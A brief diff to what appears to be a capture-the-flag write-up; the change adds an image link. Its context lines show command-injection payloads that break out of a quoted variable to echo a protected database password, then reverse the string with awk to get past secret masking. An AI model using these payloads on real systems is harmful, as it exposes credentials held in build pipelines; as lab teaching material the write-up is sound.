@@ -69,6 +69,8 @@ TEACHER=$(echo ''); echo $db_pass; # Review: '
 
 This first test will give us a glimpse of mask `***` LMAO since the secrets variable is protected. To unmask the flag we need to reverse the string with basic `awk` for strings manipulations.
 
+![Alt text](images/image-4.png)
+
 ```bash
 '); echo "$db_pass" | awk '{ for(i=length;i!=0;i--) printf "%s",substr($0,i,1); print "" }'; # Review: '
 ```
